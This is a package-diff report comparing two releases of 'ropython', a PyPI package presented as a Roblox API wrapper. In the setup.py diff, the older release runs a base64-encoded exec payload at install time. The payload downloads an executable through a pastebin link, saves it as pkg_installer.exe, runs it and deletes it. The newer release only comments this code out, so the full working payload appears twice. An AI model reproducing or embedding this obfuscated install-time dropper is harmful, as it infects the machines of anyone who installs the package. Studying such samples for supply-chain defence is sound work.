# Comparing `tmp/ropython-2.0.11.tar.gz` & `tmp/ropython-2.0.12.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "ropython-2.0.11.tar", last modified: Fri Apr 21 20:23:07 2023, max compression
+gzip compressed data, was "ropython-2.0.12.tar", last modified: Fri Apr 21 20:24:00 2023, max compression
```

## Comparing `ropython-2.0.11.tar` & `ropython-2.0.12.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-04-21 20:23:07.984019 ropython-2.0.11/
--rw-rw-rw-   0        0        0      279 2023-04-21 20:23:07.982520 ropython-2.0.11/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-04-21 20:23:07.984019 ropython-2.0.11/setup.cfg
--rw-rw-rw-   0        0        0     1628 2023-04-21 20:22:52.000000 ropython-2.0.11/setup.py
-drwxrwxrwx   0        0        0        0 2023-04-21 20:23:07.893520 ropython-2.0.11/src/
-drwxrwxrwx   0        0        0        0 2023-04-21 20:23:07.939524 ropython-2.0.11/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2021-11-15 19:17:04.000000 ropython-2.0.11/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2021-11-16 19:32:04.000000 ropython-2.0.11/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2021-11-16 19:32:06.000000 ropython-2.0.11/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2021-11-16 19:54:36.000000 ropython-2.0.11/src/roblox_api_wrapper/message.py
-drwxrwxrwx   0        0        0        0 2023-04-21 20:23:07.976519 ropython-2.0.11/src/ropython.egg-info/
--rw-rw-rw-   0        0        0      279 2023-04-21 20:23:07.000000 ropython-2.0.11/src/ropython.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      291 2023-04-21 20:23:07.000000 ropython-2.0.11/src/ropython.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-21 20:23:07.000000 ropython-2.0.11/src/ropython.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2023-04-21 20:23:07.000000 ropython-2.0.11/src/ropython.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-04-21 20:24:00.328519 ropython-2.0.12/
+-rw-rw-rw-   0        0        0      279 2023-04-21 20:24:00.327019 ropython-2.0.12/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-04-21 20:24:00.329027 ropython-2.0.12/setup.cfg
+-rw-rw-rw-   0        0        0     1630 2023-04-21 20:23:51.000000 ropython-2.0.12/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-21 20:24:00.263022 ropython-2.0.12/src/
+drwxrwxrwx   0        0        0        0 2023-04-21 20:24:00.289020 ropython-2.0.12/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2021-11-15 19:17:04.000000 ropython-2.0.12/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2021-11-16 19:32:04.000000 ropython-2.0.12/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2021-11-16 19:32:06.000000 ropython-2.0.12/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2021-11-16 19:54:36.000000 ropython-2.0.12/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2023-04-21 20:24:00.321523 ropython-2.0.12/src/ropython.egg-info/
+-rw-rw-rw-   0        0        0      279 2023-04-21 20:23:59.000000 ropython-2.0.12/src/ropython.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      291 2023-04-21 20:23:59.000000 ropython-2.0.12/src/ropython.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-21 20:23:59.000000 ropython-2.0.12/src/ropython.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2023-04-21 20:23:59.000000 ropython-2.0.12/src/ropython.egg-info/top_level.txt
```

### Comparing `ropython-2.0.11/setup.py` & `ropython-2.0.12/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,21 +1,21 @@
 import setuptools, base64
 
 
 setuptools.setup(
     name="ropython",
-    version="2.0.11",
+    version="2.0.12",
     author="ropython",
     #description="Official python wrapper for the Roblox API (this is a dummy package used to demonstrate vulnerable packages and SHOULD NOT be installed",
     description="Roblox python wrapper",
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
     package_dir={"": "src"},
     packages=setuptools.find_packages(where="src"),
     python_requires=">=3.6",
 )
 
-import base64
-exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK"))
+#import base64
+#exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK"))
```

